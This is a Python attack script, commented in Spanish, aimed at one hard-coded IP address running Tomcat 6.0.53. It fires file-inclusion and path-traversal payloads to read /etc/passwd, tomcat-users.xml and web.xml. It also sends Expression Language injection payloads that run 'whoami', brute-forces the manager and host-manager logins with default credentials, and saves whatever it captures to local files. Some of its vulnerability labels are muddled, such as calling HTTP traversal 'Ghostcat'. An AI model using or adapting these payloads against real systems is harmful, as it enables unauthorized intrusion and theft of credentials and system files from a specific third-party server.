import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Tomcat6SpecializedExploit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def exploit_jsp_include_vulnerability(self):
        """Explota vulnerabilidad de include en JSP (común en Tomcat 6)"""
        print("[*] Explotando vulnerabilidad JSP include...")
        
        include_payloads = [
            "/examples/jsp/include/include.jsp?page=../../../../etc/passwd",
            "/examples/jsp/include/include.jsp?file=../../../../conf/tomcat-users.xml",
            "/examples/jsp/include/include.jsp?page=..\\..\\..\\..\\windows\\win.ini",
            "/examples/jsp/include/include.jsp?url=file:///etc/passwd",
            "/examples/jsp/include/include.jsp?page=https://189.254.143.102/manager/html"
        ]
        
        for payload in include_payloads:
            try:
                url = f"{self.base_url}{payload}"
                response = self.session.get(url, timeout=8)
                
                if "root:" in response.text:
                    print(f"[!] ¡VULNERABLE! LFI via include: {payload}")
                    self.save_result("lfi_passwd.txt", response.text)
                elif "tomcat-users" in response.text:
                    print(f"[!] ¡VULNERABLE! Configuración expuesta: {payload}")
                    self.save_result("tomcat_users.xml", response.text)
                elif response.status_code != 404:
                    print(f"[+] Respuesta interesante ({response.status_code}): {payload}")
                    
            except Exception as e:
                print(f"[-] Error en {payload}: {e}")

    def test_el_injection(self):
        """Prueba Expression Language Injection (Tomcat 6 vulnerable)"""
        print("\n[*] Probando Expression Language Injection...")
        
        el_payloads = [
            "/examples/jsp/jsp2/el/basic-arithmetic.jsp?expr=${7*7}",
            "/examples/jsp/jsp2/el/basic-arithmetic.jsp?expr=${Runtime.getRuntime().exec('whoami')}",
            "/examples/jsp/jsp2/el/functions.jsp?fn:length=test",
            "/examples/jsp/jsp2/el/implicit-objects.jsp?param=${param}",
        ]
        
        for payload in el_payloads:
            try:
                url = f"{self.base_url}{payload}"
                response = self.session.get(url, timeout=5)
                
                if "49" in response.text and "${7*7}" in payload:
                    print(f"[!] Posible EL Injection: {payload}")
                if "Runtime" in response.text:
                    print(f"[!] ¡EL Injection confirmada!")
                    
            except Exception as e:
                print(f"[-] Error EL: {e}")

    def exploit_cve_2020_1938(self):
        """Prueba Ghostcat vulnerability (afecta Tomcat 6)"""
        print("\n[*] Probando CVE-2020-1938 (Ghostcat)...")
        
        # Ghostcat afecta Tomcat 6 si AJP está expuesto
        ghostcat_payloads = [
            "/examples/docs/../../../../../../WEB-INF/web.xml",
            "/examples/..\\..\\..\\..\\..\\..\\WEB-INF\\web.xml",
            "/examples/%2e%2e/%2e%2e/%2e%2e/%2e%2e/WEB-INF/web.xml"
        ]
        
        for payload in ghostcat_payloads:
            try:
                url = f"{self.base_url}{payload}"
                response = self.session.get(url, timeout=10)
                
                if "<web-app" in response.text and "xmlns" in response.text:
                    print(f"[!] ¡WEB-INF expuesto! Ghostcat posible: {payload}")
                    self.save_result("web.xml", response.text)
                    
            except Exception as e:
                print(f"[-] Error Ghostcat: {e}")

    def brute_force_with_workaround(self):
        """Fuerza bruta con técnicas de bypass"""
        print("\n[*] Fuerza bruta con bypass techniques...")
        
        bypass_techniques = [
            "admin:admin", "admin:admin1", "Admin:admin", "ADMIN:admin",
            "tomcat:Tomcat", "Tomcat:tomcat", "TOMCAT:tomcat",
            "manager:manager", "Manager:manager", "MANAGER:manager",
            "admin:tomcat6", "tomcat:tomcat6", "admin:6.0.53",
            "site:site", "sito:sito", "misitio:misitio",
            "test:test", "demo:demo", "dev:dev"
        ]
        
        targets = [
            f"{self.base_url}/manager/html",
            f"{self.base_url}/host-manager/html"
        ]
        
        for target in targets:
            for creds in bypass_techniques:
                username, password = creds.split(":")
                try:
                    response = requests.get(target, auth=(username, password), 
                                          verify=False, timeout=8)
                    if response.status_code == 200 and "Tomcat" in response.text:
                        print(f"[!] ¡CREDENCIALES VÁLIDAS! {username}:{password} en {target}")
                        return username, password
                    elif response.status_code == 200:
                        print(f"[+] Código 200 con {username}:{password} - revisar manualmente")
                except:
                    pass
        
        print("[-] No se encontraron credenciales")

    def save_result(self, filename, content):
        """Guarda resultados interesantes"""
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            print(f"[+] Resultado guardado en: {filename}")
        except:
            pass

    def run_complete_exploit(self):
        """Ejecuta explotación completa"""
        print("=== EXPLOTACIÓN ESPECÍFICA TOMCAT 6.0.53 ===\n")
        
        self.exploit_jsp_include_vulnerability()
        self.test_el_injection()
        self.exploit_cve_2020_1938()
        self.brute_force_with_workaround()

# Ejecutar
exploiter = Tomcat6SpecializedExploit("189.254.143.102")
exploiter.run_complete_exploit()